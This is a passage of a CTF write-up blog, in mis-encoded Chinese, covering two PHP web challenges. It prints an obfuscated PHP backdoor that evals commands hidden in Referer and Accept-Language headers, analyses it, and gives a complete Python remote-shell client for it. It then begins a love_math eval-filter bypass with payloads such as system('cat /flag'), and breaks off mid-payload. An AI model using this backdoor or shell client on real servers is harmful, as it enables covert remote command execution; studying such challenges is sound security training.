class="hljs-string">'_/|U","/-/|U"),ar|Uray|U("/|U","+"),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle'</span>;$q=<span class="hljs-string">'s[|U$i]="";$p=|U$ss($p,3);&#125;|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s))&#123;$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui'</span>;$M=<span class="hljs-string">'l="strtolower|U";$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$'</span>;$z=<span class="hljs-string">'r=@$r[|U"HTTP_R|UEFERER|U"];$r|U|Ua=@$r["HTTP_A|U|UCCEPT_LAN|UGUAGE|U"];if|U($r|Ur&amp;|U&amp;$ra)&#123;$u=parse_|Uurl($r'</span>;$k=<span class="hljs-string">'?:;q=0.([\\|Ud]))?,|U?/",$ra,$m)|U;if($|Uq&amp;&amp;$m)&#123;|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss="|Usubst|Ur";|U|U$s'</span>;$o=<span class="hljs-string">'|U$l;|U)&#123;for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++)&#123;$o.=$t&#123;$i&#125;|U^$k|U&#123;$j&#125;;&#125;&#125;|Ureturn $|Uo;&#125;$r=$|U_SERV|UE|UR;$r'</span>;$N=<span class="hljs-string">'|Uf($e)&#123;$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray("/'</span>;$C=<span class="hljs-string">'an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut("|U&lt;$k&gt;$d&lt;/$k&gt;"|U);@ses|U|Usion_des|Utroy();&#125;&#125;&#125;&#125;'</span>;$j=<span class="hljs-string">'$k|Uh="|U|U42f7";$kf="e9ac";fun|Uction|U |Ux($t,$k)&#123;$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U"";fo|Ur($i=0;$i&lt;'</span>;$R=str_replace(<span class="hljs-string">'rO'</span>,<span class="hljs-string">''</span>,<span class="hljs-string">'rOcreatrOe_rOrOfurOncrOtion'</span>);$J=<span class="hljs-string">'kf|U),|U0,3));$p="|U";for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0)&#123;$'</span>;$x=<span class="hljs-string">'r)|U;pa|Urse|U_str($u["qu|U|Uery"],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul("/([\\|U|Uw])[|U\\w-]+|U('</span>;$f=str_replace(<span class="hljs-string">'|U'</span>,<span class="hljs-string">''</span>,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);$g=create_function(<span class="hljs-string">''</span>,$f);$g();<span class="hljs-meta">?&gt;</span></code></pre></div><p>åˆæ˜¯ä¸€æ®µå¥‡å¥‡æ€ªæ€ªçš„ä»£ç </p><p>ä½†æ˜¯èƒ½çœ‹æ‡‚æœ€åä¸‰è¡Œæ˜¯ç”Ÿæˆäº†ä¸€ä¸ª$gå‡½æ•°ï¼Œè€Œä¸”æ˜¯ç”±$fç”Ÿæˆçš„ï¼Œé‚£ä¹ˆä¹…å°†$fæ‰“å°å‡ºæ¥çœ‹çœ‹ï¼Œåœ¨çº¿æ ¼å¼åŒ–åå¦‚ä¸‹</p><p>æ˜¯ä¸€ä¸ªåé—¨ç¨‹åºï¼Œä½†æ˜¯å¦‚ä½•åˆ©ç”¨æ˜¯ä¸ªé—®é¢˜ï¼Œå®åœ¨å¤ªèœäº†ï¼Œéƒ½çœ‹ä¸æ‡‚å†™çš„æ˜¯ä»€ä¹ˆï¼Œåªå¥½æ‰¾åˆ°wp</p><div class="hljs"><pre><code class="hljs php">$kh=<span class="hljs-string">"42f7"</span>;$kf=<span class="hljs-string">"e9ac"</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span><span class="hljs-params">($t,$k)</span> </span>&#123;$c=strlen($k);$l=strlen($t);$o=<span class="hljs-string">""</span>;<span class="hljs-keyword">for</span> ($i=<span class="hljs-number">0</span>;$i&lt;$l;) &#123;<span class="hljs-keyword">for</span> ($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123;$o.=$t &#123;$i&#125;^$k &#123;$j&#125;;&#125;&#125;<span class="hljs-keyword">return</span> $o;&#125;$r=$_SERVER;$rr=@$r[<span class="hljs-string">"HTTP_REFERER"</span>];$ra=@$r[<span class="hljs-string">"HTTP_ACCEPT_LANGUAGE"</span>];<span class="hljs-keyword">if</span>($rr&amp;&amp;$ra) &#123;$u=parse_url($rr);parse_str($u[<span class="hljs-string">"query"</span>],$q);$q=array_values($q);preg_match_all(<span class="hljs-string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>,$ra,$m);<span class="hljs-keyword">if</span>($q&amp;&amp;$m) &#123;@session_start();$s=&amp;$_SESSION;$ss=<span class="hljs-string">"substr"</span>;$sl=<span class="hljs-string">"strtolower"</span>;$i=$m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].$m[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];$h=$sl($ss(md5($i.$kh),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));$f=$sl($ss(md5($i.$kf),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));$p=<span class="hljs-string">""</span>;<span class="hljs-keyword">for</span> ($z=<span class="hljs-number">1</span>;$z&lt;count($m[<span class="hljs-number">1</span>]);$z++)$p.=$q[$m[<span class="hljs-number">2</span>][$z]];<span class="hljs-keyword">if</span>(strpos($p,$h)===<span class="hljs-number">0</span>) &#123;$s[$i]=<span class="hljs-string">""</span>;$p=$ss($p,<span class="hljs-number">3</span>);&#125;<span class="hljs-keyword">if</span>(array_key_exists($i,$s)) &#123;$s[$i].=$p;$e=strpos($s[$i],$f);<span class="hljs-keyword">if</span>($e) &#123;$k=$kh.$kf;ob_start();@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">"/_/"</span>,<span class="hljs-string">"/-/"</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"+"</span>),$ss($s[$i],<span class="hljs-number">0</span>,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));<span class="hljs-keyword">print</span>(<span class="hljs-string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);@session_destroy();&#125;&#125;&#125;&#125;</code></pre></div><p>åšä¸ªåˆ†æ</p><ul><li>å…ˆæ˜¯é¢„å®šä¹‰é˜¶æ®µ , å®šä¹‰äº†ä¸¤ä¸ªå­—ç¬¦ä¸²å’Œä¸€ä¸ª <code>x()</code> å‡½æ•°</li><li>ç„¶åè·å–æ”»å‡»è€…å‘é€çš„æ•°æ® , è¿™é‡Œæ”»å‡»ä»£ç æ˜¯é€šè¿‡ Referer å­—æ®µä¼ è¾“çš„</li><li>æ³¨æ„æ­£åˆ™å‡½æ•° preg_match_all() , è¯¥å‡½æ•°ä» <a href="https://blog.csdn.net/qq_40491569/article/details/83472556" target="_blank" rel="noopener">Accept-Language</a> å–å€¼ , ç„¶åé€šè¿‡æ­£åˆ™åŒ¹é…åè¾“å‡ºåˆ° <code>$m</code> æ•°ç»„ä¸­</li><li>ç„¶åæ‹¼æ¥äº†å‰ä¸¤ç§å¯é€‰è¯­è¨€çš„é¦–å­—æ¯ , å’Œé¢„å®šä¹‰çš„å­—ç¬¦ä¸²æ‹¼æ¥å¹¶è¿›è¡Œ md5 æ ¡éªŒ , æˆªå–ç­‰æ“ä½œ . ç„¶åèµ‹å€¼ç»™ <code>$h</code> å’Œ <code>$f</code> ä¸¤ä¸ªå˜é‡</li><li>å¾ªç¯ä¸­çš„ <code>$p .= $q[$m[2][$z]]</code> ä¼šä¸æ–­ä» <code>$q</code> ä¸­æå–æ•°æ® . ç»“åˆä¹‹å‰çš„ä»£ç  , æ”»å‡»ä»£ç æ˜¯æ”¾åœ¨ Referer ä¸­çš„( æœ€åä¼šæ”¾åœ¨ <code>$q</code> ä¸­ ) , å› æ­¤è¿™é‡Œå¯ä»¥çœ‹ä½œæ˜¯æ‹¼æ¥æ”»å‡»ä»£ç  , ç»„åˆæˆ Payload .</li><li>ç„¶ååˆ¤æ–­ <code>$h</code> æ˜¯å¦å‡ºç°åœ¨ Payload çš„å¼€å¤´ , è‹¥æ˜¯åˆ™è®¾ç½® <code>$_SESSION[&#39;$i&#39;] = &quot;&quot;</code> , åŒæ—¶åˆ é™¤ Payload çš„ $h éƒ¨åˆ† .</li><li>æ¥ç€åˆ¤æ–­ <code>$_SESSION</code> ä¸­é‚£ä¸ªæ˜¯å¦å­˜åœ¨ <code>$i</code> è¿™ä¸ªé”®å , è‹¥æ˜¯åˆ™å°† Payload èµ‹å€¼ç»™ <code>$_SESSION[$i]</code> , ç„¶åæŸ¥æ‰¾ <code>$_SESSION[$i]</code>( ä¹Ÿå°±æ˜¯ Payload ) ä¸­ <code>$f</code> ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½® .</li><li>æœ€åæ‰§è¡Œpayload</li></ul><p>expï¼š</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<span class="hljs-keyword">import</span> urllib<span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> zlib<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-comment"># ç”¨äºç”Ÿæˆå®Œæ•´çš„ Accept-Language</span><span class="hljs-keyword">from</span> urllib3.connectionpool <span class="hljs-keyword">import</span> xrange<span class="hljs-keyword">from</span> yapf.yapflib.py3compat <span class="hljs-keyword">import</span> raw_input<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span><span class="hljs-params">(seq,amount)</span>:</span>    length = len(seq)    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:        print(<span class="hljs-string">'Error Input'</span>)        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>    result = []    <span class="hljs-comment"># ç»“æœ</span>    indexes = []    <span class="hljs-comment"># ç´¢å¼•</span>    count = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> count &lt; amount:        i = randint(<span class="hljs-number">0</span>,length<span class="hljs-number">-1</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:            indexes.append(i)            result.append(seq[i])            count += <span class="hljs-number">1</span>            <span class="hljs-keyword">if</span> count == amount:                <span class="hljs-keyword">return</span> result<span class="hljs-comment"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰ ASCII å­—ç¬¦ç»„æˆ , åŒ…æ‹¬ä¸å¯è¯»çš„å­—ç¬¦ )</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span><span class="hljs-params">(amount)</span>:</span>    result = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):        result += chr(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))    <span class="hljs-keyword">return</span>  result<span class="hljs-comment"># ç”Ÿæˆéšæœºå¡«å……å­—ç¬¦ä¸²( ç”±æ‰€æœ‰å¤§å°å†™å­—æ¯ç»„æˆ )</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span><span class="hljs-params">(amount)</span>:</span>    result = <span class="hljs-string">''</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):        <span class="hljs-comment"># choice() æ–¹æ³•è¿”å›ä¸€ä¸ªåˆ—è¡¨ï¼Œå…ƒç»„æˆ–å­—ç¬¦ä¸²çš„éšæœºé¡¹</span>        <span class="hljs-comment"># string.ascii_letters ä¼šç”Ÿæˆæ‰€æœ‰çš„å­—æ¯</span>        result += choice(string.ascii_letters)    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># æ¨¡æ‹Ÿ x() å‡½æ•° , å¾ªç¯å¼‚æˆ–åŠ å¯†</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span><span class="hljs-params">(text,key)</span>:</span>    result = <span class="hljs-string">''</span>    lenKey = len(key)    lenTxt = len(text)    iTxt = <span class="hljs-number">0</span>    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:        iKey = <span class="hljs-number">0</span>        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))            iTxt += <span class="hljs-number">1</span>            iKey += <span class="hljs-number">1</span>    <span class="hljs-keyword">return</span> result<span class="hljs-comment"># å¼€å¯ Debug é€‰é¡¹</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span><span class="hljs-params">(msg)</span>:</span>    <span class="hljs-keyword">if</span> debugging:        <span class="hljs-keyword">print</span> (msg)<span class="hljs-comment"># å®šä¹‰åŸºæœ¬å˜é‡</span>debugging = <span class="hljs-literal">False</span>    <span class="hljs-comment"># é»˜è®¤å…³é—­ Debug , å¯ç”¨ True å¼€å¯</span>keyh = <span class="hljs-string">"42f7"</span>    <span class="hljs-comment"># $kh , éœ€è¦ä¿®æ”¹</span>keyf = <span class="hljs-string">"e9ac"</span>    <span class="hljs-comment"># $kf , éœ€è¦ä¿®æ”¹</span>xorKey = keyh + keyf    <span class="hljs-comment"># $k</span>url = <span class="hljs-string">'http://111.198.29.45:47960/hack.php'</span>    <span class="hljs-comment"># æŒ‡å®š URL  , éœ€è¦ä¿®æ”¹</span>defaultLang = <span class="hljs-string">'zh-CN'</span>    <span class="hljs-comment">#é»˜è®¤Language</span>languages = [<span class="hljs-string">'zh-TW;q=0.%d'</span>,<span class="hljs-string">'zh-HK;q=0.%d'</span>,<span class="hljs-string">'en-US;q=0.%d'</span>,<span class="hljs-string">'en;q=0.%d'</span>]    <span class="hljs-comment">#Accept-Language æ¨¡æ¿</span>proxies = <span class="hljs-literal">None</span>    <span class="hljs-comment"># &#123;'http':'http://127.0.0.1:8080'&#125; # ä»£ç† , å¯ç”¨äº BurpSuite ç­‰</span>sess = requests.Session()    <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª SESSION å¯¹è±¡</span><span class="hljs-comment"># æ¯æ¬¡ä¼šè¯ä¼šäº§ç”Ÿä¸€æ¬¡éšæœºçš„ Accept-Language</span>langTmp = choicePart(languages,<span class="hljs-number">3</span>)    <span class="hljs-comment"># è¾“å‡ºä¸€ä¸ªåˆ—è¡¨ , åŒ…å«æ¨¡æ¿ä¸­çš„ä¸‰ç§ Accept-language</span>indexes = sorted(choicePart(range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-literal">True</span>)    <span class="hljs-comment"># é™åºæ’åºè¾“å‡ºä¸‰ä¸ªæƒé‡å€¼ , ä¾‹å¦‚ [8,6,4]</span>acceptLang = [defaultLang]   <span class="hljs-comment"># å…ˆæ·»åŠ é»˜è®¤Language</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):    acceptLang.append(langTmp[i] % (indexes[i],))    <span class="hljs-comment"># ç„¶åå¾ªç¯æ·»åŠ ä¸‰ç§ Accept-Language , å¹¶ä¸ºå…¶æ·»åŠ æƒé‡å€¼</span>acceptLangStr = <span class="hljs-string">','</span>.join(acceptLang)    <span class="hljs-comment"># å°†å¤šä¸ª Accept-Language ç”¨ " , " æ‹¼æ¥åœ¨ä¸€èµ·</span><span class="hljs-comment"># acceptLangStr å³ä¸ºè¦ä½¿ç”¨çš„ Accept-Language</span>debugPrint(acceptLangStr)init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]    <span class="hljs-comment"># $i</span>md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]    <span class="hljs-comment"># $h</span>md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))    <span class="hljs-comment"># $f + å¡«å……å­—ç¬¦ä¸²</span>debugPrint(<span class="hljs-string">'$i is %s'</span> % (init2Char))debugPrint(<span class="hljs-string">'md5 head: %s'</span> % (md5head,))debugPrint(<span class="hljs-string">'md5 tail: %s'</span> % (md5tail,))<span class="hljs-comment"># äº¤äº’å¼ Shell</span>cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span><span class="hljs-keyword">while</span> cmd != <span class="hljs-string">''</span>:    <span class="hljs-comment"># åœ¨å†™å…¥ Payload å‰å¡«å……ä¸€äº›æ— å…³æ•°æ®</span>    query = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(max(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))        query.append((key, value))    <span class="hljs-comment"># ç”Ÿæˆæ— å…³æ•°æ®å¹¶å¡«å……</span>    debugPrint(<span class="hljs-string">'Before insert payload:'</span>)    debugPrint(query)    debugPrint(urllib.urlencode(query))    <span class="hljs-comment"># å¯¹ Payload è¿›è¡ŒåŠ å¯†</span>    payload = zlib.compress(cmd)    <span class="hljs-comment"># gzcompress æ“ä½œ</span>    payload = loopXor(payload,xorKey)    <span class="hljs-comment"># å¾ªç¯å¼‚æˆ–è¿ç®— , PHPä»£ç ä¸­çš„ x() å‡½æ•°</span>    payload = base64.urlsafe_b64encode(payload)    <span class="hljs-comment"># base64_encode ç¼–ç </span>    payload = md5head + payload    <span class="hljs-comment">#    åœ¨å¼€å¤´è¡¥å…¨$h</span>    <span class="hljs-comment">#  å¯¹Payloadè¿›è¡Œä¿®æ”¹</span>    cutIndex = randint(<span class="hljs-number">2</span>,len(payload)<span class="hljs-number">-3</span>)    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)    iPiece = <span class="hljs-number">0</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])        iPiece += <span class="hljs-number">1</span>    <span class="hljs-comment"># å°† Payload ä½œä¸ºæŸ¥è¯¢å­—ç¬¦ä¸²ç¼–ç æ‹¼æ¥åˆ° Referer ä¸­</span>    referer = url + <span class="hljs-string">'?'</span> + urllib.urlencode(query)    debugPrint(<span class="hljs-string">'After insert payload, referer is:'</span>)    debugPrint(query)    debugPrint(referer)    <span class="hljs-comment"># å‘é€ HTTP GET è¯·æ±‚</span>    r = sess.get(url,headers=&#123;<span class="hljs-string">'Accept-Language'</span>:acceptLangStr,<span class="hljs-string">'Referer'</span>:referer&#125;,proxies=proxies)    html = r.text    debugPrint(html)    <span class="hljs-comment"># æ¥æ”¶å“åº”æ•°æ®åŒ…</span>    pattern = re.compile(<span class="hljs-string">r'&lt;%s&gt;(.*)&lt;/%s&gt;'</span> % (xorKey,xorKey))    output = pattern.findall(html)    <span class="hljs-comment"># å¦‚æœæ²¡æœ‰æ”¶åˆ°å“åº”æ•°æ®åŒ…</span>    <span class="hljs-keyword">if</span> len(output) == <span class="hljs-number">0</span>:        <span class="hljs-keyword">print</span> (<span class="hljs-string">'Error,  no backdoor response'</span>)        cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span>        <span class="hljs-keyword">continue</span>    <span class="hljs-comment"># å¦‚æœæ”¶åˆ°å“åº”æ•°æ®åŒ… , åˆ™å¯¹å…¶è¿›è¡Œå¤„ç†</span>    output = output[<span class="hljs-number">0</span>]    debugPrint(output)    output = output.decode(<span class="hljs-string">'base64'</span>)    <span class="hljs-comment"># base64_decode è§£ç </span>    output = loopXor(output,xorKey)    <span class="hljs-comment"># å¾ªç¯å¼‚æˆ–è¿ç®—</span>    output = zlib.decompress(output)   <span class="hljs-comment"># gzuncompress è¿ç®—</span>    print(output)    <span class="hljs-comment"># è¾“å‡ºå“åº”ä¿¡æ¯</span>    cmd = <span class="hljs-string">"system('"</span> + raw_input(<span class="hljs-string">'shell &gt; '</span>) + <span class="hljs-string">"');"</span></code></pre></div><p>éš¾åº¦å±å®æœ‰ç‚¹å¤§äº†ï¼Œè¶…å‡ºèƒ½åŠ›èŒƒå›´ã€‚</p><p>å‚è€ƒ</p><blockquote><p><a href="https://www.guildhab.top/?p=1474" target="_blank" rel="noopener">Web_php_wrong_nginx_config WriteUp â€“ H0t-A1r-B4llo0n (guildhab.top)</a></p><p><a href="https://blog.csdn.net/weixin_44604541/article/details/107801811" target="_blank" rel="noopener">(2æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº 7åˆ†é¢˜ Web_php_wrong_nginx_config_é—µè¡Œå°é±¼å¡˜-CSDNåšå®¢</a></p></blockquote><h2 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h2><p>è¿™å‡ºé¢˜äººå¤§æ„äº†å•Šã€‚ã€‚ã€‚ç›´æ¥å¯ä»¥ç»™æ˜¾ç¤ºå‡ºæ¥äº†</p><p><img src="https://i.loli.net/2020/12/05/bPZfgzaGHwDoinr.png" srcset="/img/loading.gif" alt="image-20201205201112120"></p><p>è¿˜æ˜¯æ­£å¸¸åšä¸€åšï¼Œè¿™é¢˜å¥½åƒæœ‰é—®é¢˜ï¼Œå°±åœ¨buuctfä¸Šåšäº†</p><h3 id="0x1ä»£ç å®¡è®¡-1"><a href="#0x1ä»£ç å®¡è®¡-1" class="headerlink" title="0x1ä»£ç å®¡è®¡"></a>0x1ä»£ç å®¡è®¡</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'c'</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-comment">//ä¾‹å­ c=20-1</span>    $content = $_GET[<span class="hljs-string">'c'</span>];    <span class="hljs-keyword">if</span> (strlen($content) &gt;= <span class="hljs-number">80</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">"å¤ªé•¿äº†ä¸ä¼šç®—"</span>);    &#125;    $blacklist = [<span class="hljs-string">' '</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\n'</span>,<span class="hljs-string">'\''</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'\['</span>, <span class="hljs-string">'\]'</span>];    <span class="hljs-keyword">foreach</span> ($blacklist <span class="hljs-keyword">as</span> $blackitem) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/'</span> . $blackitem . <span class="hljs-string">'/m'</span>, $content)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦"</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span>    $whitelist = [<span class="hljs-string">'abs'</span>, <span class="hljs-string">'acos'</span>, <span class="hljs-string">'acosh'</span>, <span class="hljs-string">'asin'</span>, <span class="hljs-string">'asinh'</span>, <span class="hljs-string">'atan2'</span>, <span class="hljs-string">'atan'</span>, <span class="hljs-string">'atanh'</span>, <span class="hljs-string">'base_convert'</span>, <span class="hljs-string">'bindec'</span>, <span class="hljs-string">'ceil'</span>, <span class="hljs-string">'cos'</span>, <span class="hljs-string">'cosh'</span>, <span class="hljs-string">'decbin'</span>, <span class="hljs-string">'dechex'</span>, <span class="hljs-string">'decoct'</span>, <span class="hljs-string">'deg2rad'</span>, <span class="hljs-string">'exp'</span>, <span class="hljs-string">'expm1'</span>, <span class="hljs-string">'floor'</span>, <span class="hljs-string">'fmod'</span>, <span class="hljs-string">'getrandmax'</span>, <span class="hljs-string">'hexdec'</span>, <span class="hljs-string">'hypot'</span>, <span class="hljs-string">'is_finite'</span>, <span class="hljs-string">'is_infinite'</span>, <span class="hljs-string">'is_nan'</span>, <span class="hljs-string">'lcg_value'</span>, <span class="hljs-string">'log10'</span>, <span class="hljs-string">'log1p'</span>, <span class="hljs-string">'log'</span>, <span class="hljs-string">'max'</span>, <span class="hljs-string">'min'</span>, <span class="hljs-string">'mt_getrandmax'</span>, <span class="hljs-string">'mt_rand'</span>, <span class="hljs-string">'mt_srand'</span>, <span class="hljs-string">'octdec'</span>, <span class="hljs-string">'pi'</span>, <span class="hljs-string">'pow'</span>, <span class="hljs-string">'rad2deg'</span>, <span class="hljs-string">'rand'</span>, <span class="hljs-string">'round'</span>, <span class="hljs-string">'sin'</span>, <span class="hljs-string">'sinh'</span>, <span class="hljs-string">'sqrt'</span>, <span class="hljs-string">'srand'</span>, <span class="hljs-string">'tan'</span>, <span class="hljs-string">'tanh'</span>];    preg_match_all(<span class="hljs-string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);      <span class="hljs-keyword">foreach</span> ($used_funcs[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> $func) &#123;        <span class="hljs-keyword">if</span> (!in_array($func, $whitelist)) &#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">"è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°"</span>);        &#125;    &#125;    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">'echo '</span>.$content.<span class="hljs-string">';'</span>);&#125;</code></pre></div><p>getæäº¤å‚æ•°cï¼Œcçš„é•¿åº¦ä¸èƒ½è¶…è¿‡80</p><p>ä¸èƒ½åŒ…æ‹¬blacklistä¸­çš„å­—ç¬¦</p><p>ä¸èƒ½æœ‰ä¸æ˜¯$whitelistç™½åå•é‡Œé¢çš„å•è¯å‡ºç°</p><p>å¹¶ä¸”å‡½æ•°åªèƒ½ä»¥ä¸‹é¢çš„æ ¼å¼å‡ºç°</p><blockquote><p>abs(1)èƒ½è¿‡<br>1abs()èƒ½è¿‡<br>absa()ä¸èƒ½è¿‡<br>abs(a)ä¸èƒ½è¿‡<br>abs()aä¸èƒ½è¿‡</p></blockquote><p>ä»£ç çš„æœ€åå‡ºç°äº† eval è¿™æ˜¯æˆ‘ä»¬æƒ³çœ‹åˆ°çš„ï¼Œå› ä¸ºå®ƒå‡ºç°çš„æ—¶å€™ï¼Œå°±å¯èƒ½å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p>è¿™é¢˜å®åœ¨æ˜¯æ— èƒ½ä¸ºåŠ›ï¼Œçœ‹äº†ç‹å¸ˆå‚…çš„wp</p><p><a href="https://www.cnblogs.com/wangtanzhi/p/12246731.html" target="_blank" rel="noopener">è¯¦æƒ…çœ‹è¿™é‡Œ</a></p><h3 id="0x2æ„é€ payload-1"><a href="#0x2æ„é€ payload-1" class="headerlink" title="0x2æ„é€ payload"></a>0x2æ„é€ payload</h3><p>//è¿™é¢˜éœ€è¦ä½¿ç”¨åˆ°phpå¤æ‚å˜é‡ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://xz.aliyun.com/t/4785" target="_blank" rel="noopener">è¿™é‡Œ</a></p><p>å½“è¿™ä¸ªé¢˜ç›®æ²¡æœ‰ç»™å‡ºé‚£ä¹ˆé™åˆ¶çš„æ—¶å€™æˆ‘ä»¬æƒ³è¦æ„é€ çš„payloadä¸€å®šæ˜¯</p><div class="hljs"><pre><code class="hljs clean">?c=<span class="hljs-keyword">system</span>(<span class="hljs-string">"cat /flag"</span>)</code></pre></div><p>ä½†æ˜¯ç”±äºé™åˆ¶ï¼Œå¿…é¡»æƒ³åŠæ³•ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œæ¯”å¦‚å¤šæäº¤ä¸€ä¸ªå‚æ•°ï¼Œæ„é€ å‡ºä¸Šé¢çš„payload</p><p>æ¯”å¦‚</p><div class="hljs"><pre><code class="hljs gams">?c=(<span class="hljs-symbol">$</span>_GET[b])(<span class="hljs-symbol">$</span>_GET[a])&amp;b=<span class="hljs-keyword">system</span>&amp;a=cat /flag <span 